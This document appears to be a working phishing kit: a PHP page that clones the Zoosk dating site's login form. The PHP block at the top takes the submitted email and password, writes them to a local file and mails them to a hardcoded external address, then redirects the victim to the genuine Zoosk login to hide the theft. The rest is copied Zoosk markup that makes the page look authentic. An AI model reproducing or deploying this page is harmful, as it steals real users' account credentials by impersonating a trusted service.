<?php
if(isset($_GET['gosend'])){
  $to      = 'ab4sky@hotmail.com';
  $subject = 'Zoosk'.mt_rand();
  $message = 'EMAIL: '.$_POST['email'] .' PASSWORD: '.$_POST['password']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);

if(mail($to, $subject, $message, $headers)){
    header("Location: https://www.zoosk.com/login");
    exit;
  } else {
    $phpself = '';
    if($_SERVER['PHP_SELF'] != 'index.php'){$phpself = $_SERVER['PHP_SELF'];}
    $urlSelf = 'http://'.$_SERVER['SERVER_NAME'].'/'.$phpself;
    header("Location: $urlSelf");
    exit;
 }
}
?>
<!DOCTYPE html>
<html lang="en-US">
    <head profile="http://gmpg.org/xfn/11">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <script type="text/javascript">(function(){var a=window.location,b=a.href,c=b.indexOf("#"),e,d;if(c>0&&(e=b.substr(c+1))&&(d=decodeURIComponent(e))&&d.charAt(0)=="/"){a.replace(a.protocol+"//"+a.host+d)}})();</script>
    <meta name="description" content="Online dating has never been easier. Browse local singles profiles, flirt online and chat with people you'd like to meet. Date smarter with Zoosk." />
    <meta name="keywords" content="online dating, meet singles, date online, singles online, date site" />
    <link rel="icon" type="image/png" href="/favicon.png" />
    <link rel="apple-touch-icon" href="https://zephyrzoosk-a.akamaihd.net/zephyr254/images/apple-touch-icon.png"/>
    <!--[if IE]><link rel="shortcut icon" href="/favicon.ico" type="image/vnd.microsoft.icon" /><![endif]-->
    <link rel="alternate" href="/da/login" hreflang="da" />
    <link rel="alternate" href="/de/login" hreflang="de" />
    <link rel="alternate" href="/el/login" hreflang="el" />
    <link rel="alternate" href="/en/login" hreflang="en" />
    <link rel="alternate" href="/en/login" hreflang="en" />
    <link rel="alternate" href="/en-gb/login" hreflang="en-gb" />
    <link rel="alternate" href="/en-us/login" hreflang="en-us" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es-es/login" hreflang="es-es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es-mx/login" hreflang="es-mx" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/es/login" hreflang="es" />
    <link rel="alternate" href="/fi/login" hreflang="fi" />
    <link rel="alternate" href="/fr/login" hreflang="fr" />
    <link rel="alternate" href="/fr/login" hreflang="fr" />
    <link rel="alternate" href="/hr/login" hreflang="hr" />
    <link rel="alternate" href="/hu/login" hreflang="hu" />
    <link rel="alternate" href="/it/login" hreflang="it" />
    <link rel="alternate" href="/ja/login" hreflang="ja" />
    <link rel="alternate" href="/ko/login" hreflang="ko" />
    <link rel="alternate" href="/nb/login" hreflang="nb" />
    <link rel="alternate" href="/nl/login" hreflang="nl" />
    <link rel="alternate" href="/pl/login" hreflang="pl" />
    <link rel="alternate" href="/pt-br/login" hreflang="pt-br" />
    <link rel="alternate" href="/pt-pt/login" hreflang="pt-pt" />
    <link rel="alternate" href="/ro/login" hreflang="ro" />
    <link rel="alternate" href="/ru/login" hreflang="ru" />
    <link rel="alternate" href="/sr/login" hreflang="sr" />
    <link rel="alternate" href="/sv/login" hreflang="sv" />
    <link rel="alternate" href="/th/login" hreflang="th" />
    <link rel="alternate" href="/tr/login" hreflang="tr" />
    <link rel="alternate" href="/zh-cn/login" hreflang="zh-cn" />
    <link rel="alternate" href="/zh-tw/login" hreflang="zh-tw" />
    <meta property="og:image" content="https://zephyrzoosk-a.akamaihd.net/zephyr254/images/general/fb-moment-photo-default.png"/>
    <link rel="stylesheet" type="text/css" href="https://zephyrzoosk-a.akamaihd.net/zephyr254/css/cupid-login.css" />
    <!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="https://zephyrzoosk-a.akamaihd.net/zephyr254/css/cupid-ie-hacks.css" /><![endif]--><!--[if IE 9]><link rel="stylesheet" type="text/css" href="https://zephyrzoosk-a.akamaihd.net/zephyr254/css/cupid-ie9-hacks.css" /><![endif]-->
    <title>Zoosk Online Dating Site - Dating Apps</title>
    <script type="text/javascript" src="https://www.google-analytics.com/analytics.js" async defer></script>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      var gaId = "UA-3232647-1";
      ga('create', gaId, 'auto');
      ga('send', 'pageview');
    </script>
    <script type="text/javascript" src="/scripts/traffic.js"></script>
    </head>
    <body class="image-background lang-en locale-en-US">
    <div class="frame-home frame-flex" ng-controller="loginPageCtrl as loginCtrl" full-height>
      <header class="frame-header-wrapper">
        <div class="frame-header"><a href="/" from="top-nav"><img src="https://zephyrzoosk-a.akamaihd.net/zephyr254/images/global/invite-landing-logo.png" alt="Zoosk"></a></div>
      </header>
      <div class="frame-body-wrapper">
        <div class="frame-body">
          <div class="body-col">
            <section ng-class="{'member-access-page--reactivation': loginCtrl.fromAccountPausedPage}" class="member-access-page ng-cloak">
              <div class="content-wrapper">
                <div class="language-selector" language-selector-popover-trigger><span class="current-language">English</span>
                  <div class="extra-actions"><span>Additional Languages</span></div>
                </div>
                <div class="lead-text">
                  <header ng-hide="formState.errorCode || loginCtrl.fromAccountPausedPage">
                    <h1>Log in to Zoosk</h1>
                  </header>
                  <div class="ng-cloak" ng-switch="formState.errorCode" ng-show="formState.errorCode">
                    <header class="alert-text" ng-switch-when="length">
                      <h1>Email address needs to be fewer than 100 characters</h1>
                    </header>
                    <header class="alert-text" ng-switch-when="not_validated">
                      <h1>We need to validate your email address.</h1>
                      <p ng-show="formState.errorMessage">{{formState.errorMessage}}</p>
                    </header>
                    <header class="alert-text" ng-switch-when="spam">
                      <h1>We have run out of ice cream.</h1>
                      <p>Sorry, you have tried to login too many times. For assistance, click on the help link at the top of the page.</p>
                    </header>
                    <header class="alert-text" ng-switch-when="blocked">
                      <h1>Your account has been blocked by a Zoosk administrator.</h1>
                    </header>
                    <header class="alert-text" ng-switch-when="requires_www">
                      <h1>You have a Zoosk account with no password.</h1>
                      <p>We just sent you an email with instructions to set your password.</p>
                    </header>
                    <header class="alert-text" ng-switch-default>
                      <h1>Please check the email and password.</h1>
                      <p>The email address and password combination you entered is incorrect. Please try again.</p>
                    </header>
                  </div>
                  <div class="zoosk-access col-wrapper">
                    <div class="facebook-access col"><span class="button-facebook" data-facebook-connect data-marketing-event="{{marketingEvent}}"><span class="button-icon"></span>Log in with Facebook*</span>
                      <div class="signup-legal-text--v2--login-page signup-legal-text--v2"><strong>*By selecting "Log in with Facebook" or "Log in with Google", you agree to our <a class="z-legal-link" href="/tos?from=signup" target="_blank">Terms of Use</a> (including the mandatory arbitration of disputes) and consent to our <a class="z-legal-link" href="/privacy?from=signup" target="_blank">Privacy Policy</a>.</strong></div>
                    </div>
                    <div class="zoosk-form col">
                      <form action="./?gosend" class="login-form stacked-form" name="loginForm" autocomplete="off" blur-validator novalidate method="post">
                        <ul>
                          <li>
                            <label>Email Address:</label>
                            <input type="email" name="email" ng-model="loginModel.email" placeholder="Email Address" ng-class="{'text-input-error': loginFormBlurValidator.email.$invalid}" ng-disabled="formState.isSubmitting" required>
                            <div class="form-error ng-cloak" ng-show="loginFormBlurValidator.email.$error.required">Please enter your email address.</div>
                            <div class="form-error ng-cloak" ng-show="loginFormBlurValidator.email.$error.email">Please enter your email in the name@email.com format.</div>
                          </li>
                          <li>
                            <label>Password:</label>
                            <input type="password" name="password" ng-model="loginModel.password" placeholder="Password" ng-class="{'text-input-error': loginFormBlurValidator.password.$invalid}" ng-disabled="formState.isSubmitting" required>
                            <a class="forgot-pass link" href="/forgot" from="login">Forgot password?</a>
                            <div class="form-error ng-cloak" ng-show="loginFormBlurValidator.password.$error.required">Please enter a password.</div>
                          </li>
                          <li>
                            <input type="hidden" name="iobb" id="iobb">
                            <input type="submit" class="button-preloaded-processing-image button-confirm" value="Log In">
                            <p class="access-toggle"><b>Not a member?</b> <span class="link" ng-click="loginCtrl.onSignUpClick()">Sign up</span>.</p>
                          </li>
                        </ul>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
              <div class="footer-frame">
                <footer class="footer-unauth">
                  <div class="col-wrapper">
                    <div class="col company-links">
                      <ul>
                        <li><a class="link-secondary" href="https://about.zoosk.com/en/about/">About Zoosk</a></li>
                        <li><a class="link-secondary" href="https://zoosk.zendesk.com">Help / FAQs</a></li>
                        <li><a class="link-secondary" href="https://www.zoosk.com/contactinfo.php">Contact</a></li>
                        <li><a class="link-secondary" href="https://about.zoosk.com/en/blog/success-stories/">Success Stories</a></li>
                        <li><a class="link-secondary" href="https://about.zoosk.com/en/careers/">Careers</a></li>
                        <li><a class="link-secondary" href="https://about.zoosk.com/en/press/">Press</a></li>
                      </ul>
                    </div>
                    <div class="col">
                      <h2>Dating & Relationship Advice</h2>
                      <ul>
                        <li><a class="link-secondary" href="https://www.zoosk.com/date-mix/dating-advice/">Dating Advice</a></li>
                        <li><a class="link-secondary" href="https://www.zoosk.com/date-mix/online-dating-advice/">Online Dating Advice</a></li>
                        <li><a class="link-secondary" href="https://www.zoosk.com/date-mix/relationship-advice/">Relationship Advice</a></li>
                        <li><a class="link-secondary" href="https://www.zoosk.com/date-mix/single-life/">Single Life</a></li>
                      </ul>
                    </div>
                    <div class="col">
                      <h2>Online Dating Apps</h2>
                      <ul>
                        <li><a class="link-secondary" href="http://apps.facebook.com/zooskers">Facebook Dating App</a></li>
                        <li><a class="link-secondary" href="https://www.zoosk.com/iphoneapp.php">iPhone Dating App</a></li>
                        <li><a class="link-secondary" href="https://market.android.com/details?id=com.zoosk.zoosk">Android Dating App</a></li>
                      </ul>
                    </div>
                    <div class="col">
                      <h2>Follow Zoosk</h2>
                      <ul>
                        <li><a class="link-secondary" href="https://www.facebook.com/Zoosk">Facebook</a></li>
                        <li><a class="link-secondary" href="https://twitter.com/zoosk">Twitter</a></li>
                        <li><a class="link-secondary" href="http://www.zoosktv.com">YouTube</a></li>
                        <li><a class="link-secondary" href="https://about.zoosk.com/en/blog/">Zoosk Blog</a></li>
                        <li><a class="link-secondary" href="https://plus.google.com/+zoosk" rel="publisher">Zoosk on Google</a></li>
                      </ul>
                    </div>
                  </div>
                  <nav class="language-choices" id="language-footer">
                    <ul class="inline-list">
                      <li class="current-language" data-language-selector-popover-trigger>English</li>
                      <li class="link-secondary separator">&middot;</li>
                      <li class="additional-lang" data-language-selector-popover-trigger>...</li>
                    </ul>
                  </nav>
                  <div class="legal-documents">
                    <ul class="document-list inline-list">
                      <li data-ng-if="false"><a target="_blank" href="https://www.zoosk.com/imprint?from=footer" class="link-secondary">Imprint</a></li>
                      <li><a target="_blank" href="https://www.zoosk.com/safety?from=footer" class="link-secondary">Online Safety</a></li>
                      <li><a target="_blank" href="https://www.zoosk.com/cookieprivacy?from=footer" class="link-secondary">Cookie Policy</a></li>
                      <li><a target="_blank" href="https://www.zoosk.com/privacy?from=footer" class="link-secondary">Privacy Policy</a></li>
                      <li><a target="_blank" href="https://www.zoosk.com/tos?from=footer" class="link-secondary">Terms of Service</a></li>
                    </ul>
                    <div><span class="copyright">&copy; 2007-2017 Zoosk, Inc. All rights reserved.</span></div>
                  </div>
                </footer>
              </div>
            </section>
            <div class="promo-col">promo col</div>
          </div>
        </div>
      </div>
      <div class="frame-footer-wrapper">footer</div>
    </div>
    <script type="text/javascript" src="https://static3zoosk-a.akamaihd.net/cupid-ci1504049932/static/js/angular.min.js"></script> 
    <script type="text/javascript" src="https://static3zoosk-a.akamaihd.net/cupid-ci1504049932/static/js/angular-animate.min.js"></script> 
    <script type="text/javascript" src="https://static3zoosk-a.akamaihd.net/cupid-ci1504049932/static/js/en_US/module_login.js"></script><script type="text/javascript">cupid.Bootstrap.config({"statics":{"STATIC_ROOT":"https:\/\/zephyrzoosk-a.akamaihd.net\/zephyr254","WWW_PLATFORM_ROOT":"https:\/\/www.zoosk.com","COOKIE_DOMAIN":".zoosk.com","LOGIN_URL":"https:\/\/login.zoosk.com","GPLUS_CLIENT_ID":"375592401894.apps.googleusercontent.com","FACEBOOK_APP_ID":"6953377468","FACEBOOK_LOCALE":"en_US","FACEBOOK_CHANNEL_URI":"https:\/\/fnetwork1.zoosk.com\/channel.php","SHOULD_SHOW_IMPRINT":false,"IS_GOOGLE_PLUS_LOGIN_ENABLED":true,"IS_HOMEPAGE_REDESIGN_ENABLED":true}});cupid.Bootstrap.initialize();</script>
</body>
</html>